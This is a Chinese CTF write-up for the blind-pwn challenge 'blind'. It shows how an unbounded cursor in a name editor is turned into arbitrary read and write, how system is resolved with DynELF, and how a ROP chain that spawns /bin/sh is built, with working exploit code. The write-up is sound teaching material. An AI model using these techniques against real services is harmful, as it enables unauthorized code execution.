# blind

## 题目简述

程序让用户用类似 Vim 的指令编辑 8 字节姓名：`A/D` 移动光标，`W/S` 增减当前字节，空格切换大小写，数字前缀表示重复次数。程序没有提供 ELF 和 libc，因此需要只凭交互行为建立读写原语，再动态定位 `system` 并构造 ROP。

题目的核心漏洞是全局变量 `cursor` 没有边界检查。光标越过 `namebuf[8]` 后，`p[cursor]` 可以修改主函数栈帧中的指针、返回地址等数据。

## 解题过程

### 1. 从交互恢复内存布局

源码中的关键结构如下：

```c
ssize_t cursor = 0;

int process(char *p) {
    /* 省略 getline 与数字前缀解析 */
    switch (toupper(ch)) {
        case 'W': p[cursor] += times; break;
        case 'A': cursor -= times;    break;
        case 'S': p[cursor] -= times; break;
        case 'D': cursor += times;    break;
        case ' ': p[cursor] ^= 0x20;  break;
    }
}

int main(void) {
    char namebuf[0x8];
    char *ptr = namebuf;
    /* 初始化后循环调用 print(ptr) 与 process(ptr) */
}
```

在部署所用的 Debian 11 / GCC 布局中，`namebuf` 后面紧邻局部变量 `ptr`。执行 `8D8W` 时，光标先移动到 `namebuf + 8`，再把 `ptr` 的低字节增加 8。由于 `process(ptr)` 按值传入当前指针，本轮仍使用旧的 `p` 完成修改；函数返回后，下一轮 `print(ptr)` 才使用被改写的新指针。

此时新指针恰好指向保存 `ptr` 的栈位置，程序会把这个 8 字节指针当作姓名输出，从而得到一个栈地址。该地址同时给出了两个关键位置：指针对象位于 `stack_addr`，原始 `namebuf` 位于 `stack_addr - 8`。

### 2. 构造任意地址读写

记录当前光标偏移和当前 `ptr` 值后，可以用 `W/S` 逐字节把已知旧值改成目标值：

```python
base = 0
offset = 0

def off(pos):
    global offset
    delta = pos - offset
    offset = pos
    return str(abs(delta)).encode() + (b'D' if delta > 0 else b'A')

def setval(pos, old, new):
    payload = b''
    for i, (before, after) in enumerate(zip(old, new)):
        delta = after - before
        if delta:
            payload += off(pos + i)
            payload += str(abs(delta)).encode()
            payload += b'W' if delta > 0 else b'S'
    return payload

def set_base(addr):
    global base
    payload = setval(stack_addr - base, p64(base), p64(addr))
    base = addr
    return payload
```

不论 `ptr` 当前指向哪里，指针对象本身的绝对地址始终是 `stack_addr`，所以它相对于当前基址的偏移为 `stack_addr - base`。把该指针改成任意 `addr` 后，下一轮 `print(ptr)` 会输出目标地址起始的 8 字节，这就形成了任意地址读；让 `ptr` 指向目标并调用 `setval()`，则形成已知旧值条件下的任意地址写。

```python
def leak(addr):
    payload = set_base(addr) + off(-1)
    io.sendlineafter(b'> ', payload)
    data = io.recvuntil(b'\n> ', drop=True)
    io.unrecv(b'> ')
    return data
```

把光标放到 `-1` 只是为了避免方括号插入泄露内容。由于 `print()` 固定循环 8 次，即使数据中含 `\x00`，也不会像 `%s` 那样提前终止。

### 3. 泄露地址并解析 `system`

官方 exp 读取栈上若干指针后得到：

- `stack_addr + 0x10`：libc 内部地址，可作为 DynELF 的初始指针；
- `stack_addr + 0x28`：PIE 内的返回地址，按页对齐可恢复程序基址；
- 程序首个内存页：离线交给 ROPgadget，可找到偏移为 `0x5db` 的 `pop rdi; ret`。

在没有 libc 文件的情况下，pwntools 的 `DynELF` 会通过 `leak()` 查找 ELF 动态链接结构和符号表，从而解析出 `system`：

```python
libc_ptr = u64(leak(stack_addr + 0x10))
elf_ptr = u64(leak(stack_addr + 0x28))
pie_base = elf_ptr & ~0xfff

resolver = DynELF(leak, libc_ptr, libcdb=False)
system = resolver.lookup('system', 'libc')
pop_rdi = pie_base + 0x5db
```

`0x5db` 是从题目程序的内存转储中确定的偏移，不应脱离对应构建直接照搬。如果通过 libc 指纹确认了服务器版本，也可下载完全匹配的 libc 后直接算符号地址；不确认版本便套偏移并不可靠。

### 4. 覆盖返回地址形成 ROP

连接建立后先把原始姓名 `Aaaaaaa` 改成 `/bin/sh\x00`。由于姓名就在 `stack_addr - 8`，最终栈链为：

```text
pop rdi; ret
stack_addr - 8      # "/bin/sh"
ret                 # 对齐栈
system
```

对应的关键覆盖如下：

```python
old_10 = u64(leak(stack_addr + 0x10))
old_18 = u64(leak(stack_addr + 0x18))
old_20 = u64(leak(stack_addr + 0x20))
old_28 = u64(leak(stack_addr + 0x28))

io.sendlineafter(b'> ', set_base(stack_addr))
io.sendlineafter(b'> ', setval(0x10, p64(old_10), p64(pop_rdi)))
io.sendlineafter(b'> ', setval(0x18, p64(old_18), p64(stack_addr - 8)))
io.sendlineafter(b'> ', setval(0x20, p64(old_20), p64(pop_rdi + 1)))
io.sendlineafter(b'> ', setval(0x28, p64(old_28), p64(system)))
io.sendlineafter(b'> ', b'')
io.interactive()
```

最后发送空行使 `process()` 返回 0，`main()` 执行函数尾声并落入 ROP。原题解文字称这里使用了 ret2csu，但其实际 exp 是普通的 `pop rdi; ret` 调用链；二者不能混为一谈。

源码中数字前缀变量 `rep` 在第一次使用前没有初始化，这属于未定义行为；部署构建中数字指令能够正常工作，但更稳妥的修复还应把它初始化为 0。该问题不是越界利用的必要条件。

## 方法总结

本题在无附件场景下通过交互差异恢复了程序的关键栈布局。利用链可以概括为：无边界全局光标造成越界写，改写相邻 `ptr` 后将固定 8 字节输出升级为任意读，再以同一编辑原语完成任意写，最后用 DynELF 解析 `system` 并覆盖返回地址。

分析这类盲打题时，应分别跟踪“当前显示基址”“光标相对偏移”和“指针对象的绝对位置”。同时要验证描述与 exp 是否一致：本题最终使用的是常规 ROP，而不是 ret2csu。
